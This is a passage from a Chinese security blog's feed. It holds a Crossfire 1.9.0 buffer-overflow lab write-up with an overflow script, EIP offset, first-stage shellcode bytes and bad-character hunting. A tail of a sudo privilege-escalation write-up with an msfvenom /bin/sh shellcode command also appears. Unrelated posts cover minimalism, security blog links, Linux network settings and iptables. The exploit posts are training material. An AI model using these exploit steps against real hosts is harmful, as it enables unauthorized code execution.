class="hljs-regexp">/home/</span>anansi<span class="hljs-regexp">/bin/</span>anansi_util<br><span class="hljs-regexp">/home/</span>anansi<span class="hljs-regexp">/bin/</span>anansi_util: ELF <span class="hljs-number">32</span>-bit LSB executable, Intel <span class="hljs-number">80386</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked (uses shared libs), <span class="hljs-keyword">for</span> GNU/Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">15</span>, BuildID[sha1]=<span class="hljs-number">0</span>x7c0ee1e54fe059d0d83962304a6694199b6535b7, not stripped<br><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-06/6.PNG" alt="6"><br>sudo -l显示，<code>sudo /home/anansi/bin/anansi_util</code>  这个程序运行不需要密码，所以可以将/bin/bash添加到该程序，sudo以root权限运行该程序，最终获得root权限。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>msfelfscan用来找到EIP跳转的地址</li><li><code>msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b &#39;\x00\x09\x0a&#39;</code>生成shellcode</li><li><code>payload = buf + nop + eax </code>，本次的返回地址是<code>call eax</code>，以前都是使用<code>jmp esp</code>。不太理解eax在这里起到的作用。等以后水平提升了再回头看看吧。</li></ul>]]></content>
    
    
    <categories>
      
      <category>buffer overflow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>crossfire&amp;linux缓冲区溢出案例（三）</title>
    <link href="/2020/01/28/12-x/"/>
    <url>/2020/01/28/12-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<a href="https://blog.csdn.net/zixuanfy/article/details/52578072">kali linux之edb–CrossFire缓冲区溢出</a></p><p>Crossfire 1.9.0在接受socket连接的时候，有着bof漏洞。</p><h2 id="搭建靶机"><a href="#搭建靶机" class="headerlink" title="搭建靶机"></a>搭建靶机</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">mkdir</span> <span class="hljs-string">/usr/games</span>    <br><span class="hljs-comment">#必须在该目录下运行crossfire，否则程序会报错</span><br><span class="hljs-comment">#Cannot open bmaps file /usr/games/crossfire/share/crossfire/bmaps: No such file or directory</span><br><br><span class="hljs-string">cd</span> <span class="hljs-string">/usr/games;wget</span> <span class="hljs-string">www.offensive-security.com/crossfire.tar.gz;tar</span> <span class="hljs-string">zxpf</span> <span class="hljs-string">crossfire.tar.gz</span><br><br><span class="hljs-string">cd</span> <span class="hljs-string">crossfire/bin</span><br><br><span class="hljs-string">gdb</span> <span class="hljs-string">/usr/games/crossfire/bin/crossfire</span><br><span class="hljs-string">run</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">当程序提示溢出错误的时候，可以运行run，输入y，重新调试程序</span><br><br><span class="hljs-string">当需要重新运行的时候，可以结束进程重新运行。</span><br><span class="hljs-string">pgrep</span> <span class="hljs-string">crossfire</span> <span class="hljs-string">|</span> <span class="hljs-string">xargs</span> <span class="hljs-string">kill</span> <span class="hljs-string">-s</span> <span class="hljs-number">9</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">关闭ASLR</span><br><span class="hljs-string">echo</span> <span class="hljs-number">0</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">/proc/sys/kernel/randomize_va_space</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-28-12/1.PNG" alt="1"></p><p><code>Waiting for connections...</code></p><p>面板最后出现了这样的语句，代表程序正常运行。</p><h2 id="（exp-py-demo）让程序报错"><a href="#（exp-py-demo）让程序报错" class="headerlink" title="（exp.py demo）让程序报错"></a>（exp.py demo）让程序报错</h2><p>开始调试bof漏洞</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python</span><br>import socket<br>host = <span class="hljs-string">&quot;目标IP&quot;</span><br><span class="hljs-attribute">crash</span>=<span class="hljs-string">&quot;\x41&quot;</span> * 4379<br><br>buffer = <span class="hljs-string">&quot;\x11(setup sound &quot;</span> + crash + <span class="hljs-string">&quot;\x90\x00#&quot;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;[*]Sending evil buffer...&quot;</span><br><br>s.connect((host, 13327))<br><span class="hljs-attribute">data</span>=s.recv(1024)<br><span class="hljs-builtin-name">print</span> data<br>s.send(buffer)<br>s.close()<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;[*]Payload Sent !&quot;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-28-12/2.PNG" alt="2"><br>程序报错，段错误，返回地址被<code>0x41</code>填充</p><h2 id="定位缓冲区大小"><a href="#定位缓冲区大小" class="headerlink" title="定位缓冲区大小"></a>定位缓冲区大小</h2><p><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379</code></p><p>修改python脚本，crash=”pattern_create生成的字符串”</p><p>运行后得到一个地址，<code>0x46367046</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-28-12/3.PNG" alt="3"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_offset.rb -l <span class="hljs-number">4379</span> -q <span class="hljs-number">46367046</span><br><br>[*] Exact match at offset <span class="hljs-number">4368</span><br></code></pre></div></td></tr></table></figure><p>缓冲区长度为4379，EIP地址为为4368后的4字节。</p><h2 id="测试是否找到EIP地址"><a href="#测试是否找到EIP地址" class="headerlink" title="测试是否找到EIP地址"></a>测试是否找到EIP地址</h2><p>修改python脚本<code>crash=&quot;\x41&quot; * 4368 + &quot;B&quot;*4 + &quot;C&quot;*7</code></p><p>确保报错的是0x42424242，表示EIP地址被字符B所覆盖。确认找到了EIP指令寄存器的位置。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-28-12/4.PNG" alt="4"></p><h2 id="找出shellcode占用的空间"><a href="#找出shellcode占用的空间" class="headerlink" title="找出shellcode占用的空间"></a>找出shellcode占用的空间</h2><p>edb </p><p>运行linux平台，图形化界面的调试器。图形化界面方便同时观察所有寄存器的状态。</p><p>点击图中的run按钮，运行crossfire程序，然后运行exp.py让程序报错。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-28-12/6.PNG" alt="6"></p><p>在崩溃的时候，我们再次检查任何可能帮助我们找到buffer的寄存器。</p><p>选中EAX寄存器，右键 follow in dump，即可跳转到EAX所指地址。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-28-12/7.PNG" alt="7"></p><p>在这个案例中，EAX寄存器看起来指向buffer的起始位置，包含了字符串“setup sound ”</p><p>但是EAX寄存器没有直接跳转到缓冲区（缓冲区的起始地址以A字符串开头），这可能会影响执行exp，导致失败。</p><p>在这种情况下，跳转到EAX可能实际上对我们有用。 但是，这不是一个很好的解决方案。 咱们试试更难的方案。</p><h2 id="提高exp可用性"><a href="#提高exp可用性" class="headerlink" title="提高exp可用性"></a>提高exp可用性</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-28-12/8.PNG"></p><p>看起来ESP寄存器指向了缓冲区的C地址，在崩溃的时候，没有给我们足够的空间放置shellcode。不像之前的slmail bof案例, 在程序崩溃之后，只写入了“cccccccc”这么几个字符。这暗示着我们，只能把shellcode放置在大小为4368的缓冲区之中。</p><p>然而，在崩溃时，我们可以使用ESP寄存器指向的字节，来创建第一个阶段的shellcode。它可以使得ESP寄存器与缓冲区的A字符起始位置对齐，跳过字符串“setup sound”</p><p>为了达到这个目的，我们第一阶段的shellcode将会需要添加12比特给EAX寄存器，然后跳转到EAX。让我们看看这个shellcode demo是怎样的。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">nasm_shell 汇编指令转十六进制<br><br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>nasm_shell.rb<br>add eax,<span class="hljs-number">12</span><br>jmp eax<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-28-12/5.PNG" alt="5"></p><p>然后写成16进制即可。幸运的是，这两个指令只用了5字节的内存——<code>\x83\xc0\x0c\xff\xe0</code></p><h2 id="发现坏字符"><a href="#发现坏字符" class="headerlink" title="发现坏字符"></a>发现坏字符</h2><p>和<a href="https://whale3070.github.io/buffer%2520overflow/2020/01/15/03-x/">上一篇</a>类似，发送<a href="https://raw.githubusercontent.com/Whale3070/ctf-coding/master/badchar-bof.py">exp.py</a></p><p>注意crash中exp的写法，<code>crash= badchars + &quot;\x41&quot; * 4368</code></p><p>第一段是坏字符，目的是检查是否有badchar截断后续的字符。<br>第二段目的是覆盖返回地址，使得程序报错，方便调试。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-28-12/9.PNG" alt="5"></p><p>点击图中的EBP寄存器，extended base pointer，它总是指向栈底。右键follow in dump，来跳转到EBP指向的地址。</p><p>发现有规律的字符<code>01 02 03 04 05 06 07 08</code>，失去了<code>09</code>，说明它是坏字符。</p><p>删除exp.py中 <code>\x09</code>，重复以上操作。发现坏字符<code>\x0a</code></p><p>删除exp.py中 <code>\x0a</code>，重复以上操作。发现坏字符<code>\x20</code></p><p><code>\x00\x09\x0a\x20</code>   是坏字符</p><p>badchar坏字符跟操作系统、程序有关，不同的系统运行坏字符可能并不相同。</p>]]></content>
    
    
    <categories>
      
      <category>buffer overflow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一种断舍离的生活</title>
    <link href="/2020/01/27/09-x/"/>
    <url>/2020/01/27/09-x/</url>
    
    <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>一个爱好读书的人的笔记：）</p><p>最近电视里到处都在播放冠状病毒的事情，为了安全，过年就是宅在家里了。</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>起因是看到一个日剧，讲的是一个以前东西多的不得了的妹子，卧室跟狗窝一样，后来她跟前男友分手后想要自杀。然后发现自己的卧室脏乱差，死后被别人发现了该多丢人啊。于是她开始整理屋子，越整理发现心情越好。。。</p><p>她的屋子跟我有的一拼。看了《断舍离》这本书，我好奇人最少需要多少东西就可以活下去。</p><p>选择一个减法的生活或许会更轻松。<strong>人的欲望越大，活的越累</strong>。无产阶级和资产阶级不同的是，无产阶级能够获得的金钱都是自己打工辛辛苦苦赚取的。无产阶级的定义是，没有资产，<strong>依靠劳动生存必须资金的人，无论工作赚多少钱，即使有房有车，都是无产阶级</strong>。而收租的房东，可以依靠商铺出租、房屋出租获取租金，无需劳动，就是资产阶级。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="不买的东西"><a href="#不买的东西" class="headerlink" title="不买的东西"></a>不买的东西</h3><p>有很多东西，买来虽然满足了欲望，但是对身体无益，且花钱。</p><p>例如，糖果、含糖食品，香烟，酒类，等等。</p><p>不玩游戏。游戏是针对人性制作的，非常容易让人沉迷于其中的东西。游戏玩的再好，人也不能脱离现实而活着。离开了游戏的人，在游戏中获得再多成绩，在现实里什么也不是。沉迷游戏的人显然会用尽一切来反驳我，但他们开心就好。人不能因为觉得哪个东西好，就强迫别人也喜欢。</p><p>不旅游。为什么埃及统治者，要修建金字塔？因为他们相信金字塔越大、排场越大，自己死后的陵墓，比其他统治者都大，更有面子。为什么现代人想要旅游？因为消费主义告诉他们，旅游意味着有钱有时间出门玩耍。像赶集一样，到一个又一个景点拍照，这样的事情我也干过，现在觉得旅途很累，很无聊，不想再干了。不要为了旅游而旅游。</p><h3 id="消费主义的符号象征"><a href="#消费主义的符号象征" class="headerlink" title="消费主义的符号象征"></a>消费主义的符号象征</h3><p>曾经我也是一个陷入消费主义陷阱的人。那时候疯狂迷恋派克的钢笔、后来又喜欢上了凌美的钢笔，现在想起来十分尴尬，觉得以前的自己挺蠢的（=/=）</p><p>没必要关注品牌，而关注物品的使用价值。</p><p>以前看过《多数人死于贪婪》，这本书到挺有意思，书籍章节的名字全都是奢侈品品牌不知道的人翻开这本书的目录页，还以为是奢侈品导购册子呢。</p><h3 id="扔东西，只留下有用的东西"><a href="#扔东西，只留下有用的东西" class="headerlink" title="扔东西，只留下有用的东西"></a>扔东西，只留下有用的东西</h3><p>以前是个什么东西都不肯扔掉的人、小时候看过的幼儿书、故事书、教材、笔、攒了一堆的本子…… </p><p>不穿的衣服、不合身的衣服、破旧的衣服，扔了吧。</p><p>有些东西的价值体现在过去，既然已经过去了，再也用不到它了，就扔了吧。</p><p>一个人所使用的物品，能够反映出自我形象。</p><p><strong>物品要用才有价值。</strong></p><p>不知道从何下手的人，可以看看日剧《我的家里空无一物》，它展示了怎样整理屋子，介绍了不少诀窍，值得认真学习。</p><h3 id="慎重的选择物品"><a href="#慎重的选择物品" class="headerlink" title="慎重的选择物品"></a>慎重的选择物品</h3><p>试着使用高于自我形象的物品</p><p>曾经有人送我十分精美的本子，因为十分珍惜，所以我没有用那个本子，而是好好收了起来。用的是学校统一印刷分发的本子。可是搬家的时候也只能扔掉。</p><p>美好的东西，不用才是可惜！放弃那种使用将就的东西，因为可惜，所以把好东西封存不用的想法吧！</p><h4 id="折扣陷进"><a href="#折扣陷进" class="headerlink" title="折扣陷进"></a>折扣陷进</h4><p>买东西看绝对值，而不是相对值。也就是说，一件东西从100降价到50，打了5折；一套房子从1000万，降到950万，打了95折。但是前者只便宜了50，后者便宜了50万。</p><p>当然，生活中，买东西不会差距如此明显。再举个例子，买一套衣服，店家向你推销另外更贵，但是折扣更大的衣服，你会不会因为觉得自己占便宜，而选择更贵的衣服呢？</p><p>要买自己需要的东西，而不是折扣大的、贵的东西。</p><h3 id="购物的方法论"><a href="#购物的方法论" class="headerlink" title="购物的方法论"></a>购物的方法论</h3><ul><li>选择物品的窍门，不是“能不能用”，而是“我要不要用”。</li><li>居住环境是凭借一己之力可以改变的环境。要打造出能够款待自己的空间。环境好了，心情也会随之变好。</li></ul><h3 id="省钱的小窍门："><a href="#省钱的小窍门：" class="headerlink" title="省钱的小窍门："></a>省钱的小窍门：</h3><p>有些品牌在<strong>换季</strong>的时候，打折力度十分大，可以打三四折。所以不要在新品推出的时候买，电子产品也是这样的。没必要赶时髦追求最新款的。</p><p>在网购的时候，搜品牌店的<strong>断码清仓</strong>产品，根据自己的尺码来搜索符合心意的产品，往往能买到便宜质量又好的东西。<a href="https://www.zhihu.com/question/41854964">你有哪些内行人才知道的省钱诀窍</a></p><p>断舍离不是过一种清心寡欲的生活，而是注重生活质量，不要将一堆从来不用的垃圾塞满整个屋子。使得无从打扫，或者从不打扫，显得脏乱差。你的人生也和屋子一样随随便便，得过且过。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可能是友链</title>
    <link href="/2020/01/27/12-x/"/>
    <url>/2020/01/27/12-x/</url>
    
    <content type="html"><![CDATA[<h2 id="同行的博客"><a href="#同行的博客" class="headerlink" title="同行的博客"></a>同行的博客</h2><p>纯属记录，排名不分先后。放在chrome收藏夹里从来不看是不行的…… </p><table><thead><tr><th>序号</th><th>向前辈学习…</th></tr></thead><tbody><tr><td>1</td><td><a href="https://klionsec.github.io/">https://klionsec.github.io/</a></td></tr><tr><td>2</td><td><a href="https://introspelliam.github.io/">https://introspelliam.github.io/</a></td></tr><tr><td>3</td><td><a href="https://masterxsec.github.io/archives/">https://masterxsec.github.io/archives/</a></td></tr><tr><td>4</td><td><a href="https://www.abatchy.com/">https://www.abatchy.com/</a></td></tr><tr><td>5</td><td><a href="https://www.waitalone.cn/">https://www.waitalone.cn/</a></td></tr><tr><td>6</td><td><a href="https://kionf.com/archives/">https://kionf.com/archives/</a></td></tr><tr><td>7</td><td><a href="https://diablohorn.com/">https://diablohorn.com/</a></td></tr><tr><td>8</td><td><a href="https://www.hackingarticles.in/">https://www.hackingarticles.in/</a></td></tr><tr><td>9</td><td><a href="https://www.cnblogs.com/iamstudy/category/730839.html">https://www.cnblogs.com/iamstudy/category/730839.html</a></td></tr><tr><td>10</td><td><a href="http://www.freev.cc/archives/">http://www.freev.cc/archives/</a></td></tr><tr><td>11</td><td><a href="http://shaurong.blogspot.com/">http://shaurong.blogspot.com</a></td></tr><tr><td>12</td><td><a href="https://blog.g0tmi1k.com/archives/">https://blog.g0tmi1k.com/archives/</a></td></tr><tr><td>13</td><td><a href="https://blog.ropnop.com/">https://blog.ropnop.com/</a></td></tr><tr><td>14</td><td><a href="https://diablohorn.com/">https://diablohorn.com</a></td></tr><tr><td>15</td><td><a href="https://medium.com/@hakluke">https://medium.com/@hakluke</a></td></tr><tr><td>16</td><td><a href="http://pentestmonkey.net/category/blog">http://pentestmonkey.net/category/blog</a></td></tr><tr><td>17</td><td><a href="https://p0sec.net/">https://p0sec.net/</a></td></tr><tr><td>18</td><td><a href="https://thief.one/archives/">https://thief.one/archives/</a></td></tr><tr><td>19</td><td><a href="https://program-think.blogspot.com/">https://program-think.blogspot.com/</a></td></tr><tr><td>20</td><td><a href="https://www.secice.cn/">https://www.secice.cn/</a></td></tr><tr><td>21</td><td><a href="https://blog.csdn.net/qq_34801745">https://blog.csdn.net/qq_34801745</a></td></tr><tr><td>22(前面的都是大佬，除了这个)</td><td><a href="https://www.cnblogs.com/secde0/">https://www.cnblogs.com/secde0/</a></td></tr><tr><td>23</td><td><a href="https://payloads.online/">https://payloads.online/</a></td></tr><tr><td>24</td><td><a href="http://www.8sec.cc/">http://www.8sec.cc/</a></td></tr><tr><td>25</td><td><a href="https://blog.ysneko.com/">https://blog.ysneko.com/</a></td></tr></tbody></table><p>整理文件夹的时候，发现很多博客都过期404了。自己购买的域名，很难撑过3年。而在51论坛、简书这种地方，又容易被各种原因被删除。</p><h2 id="安全行业论坛"><a href="#安全行业论坛" class="headerlink" title="安全行业论坛"></a>安全行业论坛</h2><table><thead><tr><th>序号</th><th>链接</th></tr></thead><tbody><tr><td>1</td><td><a href="https://www.t00ls.net/">https://www.t00ls.net/</a></td></tr><tr><td>2</td><td><a href="https://www.freebuf.com/">https://www.freebuf.com/</a></td></tr><tr><td>3</td><td><a href="https://paper.seebug.org/">https://paper.seebug.org</a></td></tr><tr><td>4</td><td><a href="http://www.91ri.org/">http://www.91ri.org</a></td></tr><tr><td>5</td><td><a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a></td></tr><tr><td>6</td><td><a href="http://www.fuzzysecurity.com/">http://www.fuzzysecurity.com/</a></td></tr><tr><td>7</td><td><a href="https://support.portswigger.net/">https://support.portswigger.net</a></td></tr></tbody></table><h2 id="写博客初衷"><a href="#写博客初衷" class="headerlink" title="写博客初衷"></a>写博客初衷</h2><p>我想起了建立博客的初衷</p><p>当时看大佬们的博客，然后发现写的非常之好。</p><p>但是不知道他们是怎样变得那么优秀。</p><p>也没有他们从0-1的过程</p><p>于是我就想，记录一下自己是如何从入门到放弃的，<del>成为一个大佬的</del>。</p><p>由于我从小学开始就想考清华，然后坚持到高考，虽然最后失败了吧，但也混入了一个还不错的高校。</p><p>所以，我对我的固执还蛮有信心的（=。=），不就是坚持吗，这有什么难的。</p><p>虽然我可能做不到顶尖的百分之一，但是做人做到百分之70也是可以的。</p><p>进入网安圈子，交流的同伴来了又去。发现坚持还真的蛮难的？偶尔就听说他们转头投身其他东西了，放弃了。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-27-12/%E6%8D%95%E8%8E%B7.PNG"></p>]]></content>
    
    
    <categories>
      
      <category>backup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>backup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各种系统的网卡配置</title>
    <link href="/2020/01/23/09-x/"/>
    <url>/2020/01/23/09-x/</url>
    
    <content type="html"><![CDATA[<h2 id="fedora重启修改密码"><a href="#fedora重启修改密码" class="headerlink" title="fedora重启修改密码"></a>fedora重启修改密码</h2><p><a href="https://docs.fedoraproject.org/en-US/quick-docs/reset-root-password/">https://docs.fedoraproject.org/en-US/quick-docs/reset-root-password/</a></p><p><a href="https://forums.fedoraforum.org/showthread.php?92959-cant-reset-root-passwd-Authentication-token-lock-busy">https://forums.fedoraforum.org/showthread.php?92959-cant-reset-root-passwd-Authentication-token-lock-busy</a><br>mount -o remount,rw /</p><h2 id="debian重启修改密码"><a href="#debian重启修改密码" class="headerlink" title="debian重启修改密码"></a>debian重启修改密码</h2><p><a href="https://www.vultr.com/docs/reset-the-root-password-on-debian">https://www.vultr.com/docs/reset-the-root-password-on-debian</a></p><h2 id="red-hat修改ip配置"><a href="#red-hat修改ip配置" class="headerlink" title="red hat修改ip配置"></a>red hat修改ip配置</h2><p><a href="https://blog.csdn.net/njdxtj/article/details/46595221">https://blog.csdn.net/njdxtj/article/details/46595221</a></p><h3 id="red-hat重启网卡"><a href="#red-hat重启网卡" class="headerlink" title="red hat重启网卡"></a>red hat重启网卡</h3><p>/etc/init.d/network restart</p><h2 id="debian修改ip配置"><a href="#debian修改ip配置" class="headerlink" title="debian修改ip配置"></a>debian修改ip配置</h2><p>vi /etc/network/interfaces</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-31-09/network.PNG" alt="network"></p><h3 id="debian重启网卡"><a href="#debian重启网卡" class="headerlink" title="debian重启网卡"></a>debian重启网卡</h3><p>service networking restart<br>/etc/init.d/networking restart</p><h2 id="centos修改ip配置"><a href="#centos修改ip配置" class="headerlink" title="centos修改ip配置"></a>centos修改ip配置</h2><p>vim /etc/sysconfig/network-scripts/ifcfg-eth0</p><h2 id="ubuntu修改ip配置"><a href="#ubuntu修改ip配置" class="headerlink" title="ubuntu修改ip配置"></a>ubuntu修改ip配置</h2><p>vi /etc/network/interfaces</p><h3 id="ubuntu重启网卡"><a href="#ubuntu重启网卡" class="headerlink" title="ubuntu重启网卡"></a>ubuntu重启网卡</h3><p>/etc/init.d/networking restart</p><p>如果这条提示not found<br>dhclient eth0</p><h2 id="ubuntu-18-04"><a href="#ubuntu-18-04" class="headerlink" title="ubuntu 18.04"></a>ubuntu 18.04</h2><p>vim /etc/netplan/50-cloud-init.yaml<br>netplan apply</p><h3 id="修改dns配置上网"><a href="#修改dns配置上网" class="headerlink" title="修改dns配置上网"></a>修改dns配置上网</h3><p><a href="https://www.techrepublic.com/article/how-to-set-dns-nameservers-in-ubuntu-server-18-04/">https://www.techrepublic.com/article/how-to-set-dns-nameservers-in-ubuntu-server-18-04/</a><br>vim /etc/netplan/50-cloud-init.yaml</p><p>添加nameserver，然后重启网卡</p><h2 id="查看linux系统位数"><a href="#查看linux系统位数" class="headerlink" title="查看linux系统位数"></a>查看linux系统位数</h2><p>getconf LONG_BIT<br>32<br>64</p><h2 id="ssh连接到旧设备"><a href="#ssh连接到旧设备" class="headerlink" title="ssh连接到旧设备"></a>ssh连接到旧设备</h2><p>ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc <a href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#x31;&#x30;&#46;&#50;&#x34;&#x36;&#x2e;&#x39;&#x35;&#46;&#49;&#51;&#54;">&#x72;&#111;&#111;&#x74;&#64;&#x31;&#x30;&#46;&#50;&#x34;&#x36;&#x2e;&#x39;&#x35;&#46;&#49;&#51;&#54;</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iptables-配置防火墙规则</title>
    <link href="/2020/01/23/12-x/"/>
    <url>/2020/01/23/12-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：《鸟哥的Linux私房菜服务器架设篇(第三版)》</p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>网络安全根本原因可能是由于<strong>信息不对称</strong>引起的。有些主机管理员，<strong>不知道</strong>自己开放了哪些服务，哪些是不安全的，哪些服务有漏洞，为什么不能因为好记而不使用弱密码。如果所有计算机使用者都知道的话，那么所有主机使用者都是网络安全专家了。</p><p>防火墙不能防止所有病毒、木马、漏洞利用，但是它的作用是减少攻击面。</p><p>举个例子，如果有一栋屋子，没有窗户，没有门，那么就没有人可以在不破坏屋子的情况下进去。</p><p>如果这栋屋子，所有窗户和门都开着，那么进入屋子就比关闭状态更简单了。</p><p>防火墙就是起到了将不安全的窗户和门都关上的作用。看完这篇文章，我们将会学到如何<strong>根据自己的需求配置iptables</strong>，使得linux主机更加安全。</p><h2 id="netfilter与iptables"><a href="#netfilter与iptables" class="headerlink" title="netfilter与iptables"></a>netfilter与iptables</h2><p>netfilter是linux自带的防火墙机制，叫做封包过滤。<br>封包过滤的意思就是通过数据包的各种数据（来源IP、数据包类型tcp\udp\icmp等），来决定是否让数据包通过。</p><p>iptables是一个应用封包过滤机制，下达我们的指令的软件。</p><p>iptables拥有三个默认的table, filter、nat、mangle</p><p>filter是最常用的，针对本机的table。</p><h2 id="input、output、filter"><a href="#input、output、filter" class="headerlink" title="input、output、filter"></a>input、output、filter</h2><p>在iptables中，分为输入规则input、输出规则output，顾名思义，就是在接受数据包时候<strong>哪种数据包允许，哪种不允许</strong>，这就是输入规则input，以此类推output。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-23-12/2.PNG" alt="2"></p><p>可以使用以下命令查看已有的规则：</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">iptables -<span class="hljs-keyword">nL</span> <span class="hljs-keyword">INPUT</span><br>iptables -<span class="hljs-keyword">nL</span> OUTPUT<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-23-12/1.PNG" alt="1"></p><p>上图中的Chain可以理解为规则链，就像一条链子一样，规则是依次向下进行判断的。</p><p>举个例子，第一条规则是允许所有ip的数据包，第二条规则是不允许ip为10.10.10.1的数据包。</p><p>由于规则是依次向下判断，那么规则一允许所有数据包，第二条规则就会无效。</p><h2 id="清除规则"><a href="#清除规则" class="headerlink" title="清除规则"></a>清除规则</h2><figure class="highlight tp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tp">iptables -F<br>iptables -<span class="hljs-keyword">X</span><br>iptables -<span class="hljs-keyword">Z</span><br>清除本机防火墙所有规则<br></code></pre></div></td></tr></table></figure><h2 id="定义规则"><a href="#定义规则" class="headerlink" title="定义规则"></a>定义规则</h2><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">iptables <span class="hljs-selector-attr">[-t nat]</span> -<span class="hljs-selector-tag">P</span> <span class="hljs-selector-attr">[INPUT,OUTPUT,FORWARD]</span> <span class="hljs-selector-attr">[ACCEPT,DROP ]</span><br>-t 设置<span class="hljs-selector-tag">table</span>，不加参数，默认为<span class="hljs-attribute">filter</span><br>-<span class="hljs-selector-tag">P</span> 是policy的意思，设置策略。分别为输入，输出，转发策略<br>ACCEPT,DROP 接受或丢弃数据包<br><br>---<br><br>iptables <span class="hljs-selector-attr">[-AI 链名]</span> <span class="hljs-selector-attr">[-io 网络接口]</span> <span class="hljs-selector-attr">[-p 协议]</span> <span class="hljs-selector-attr">[-s 来源IP/网域]</span> <span 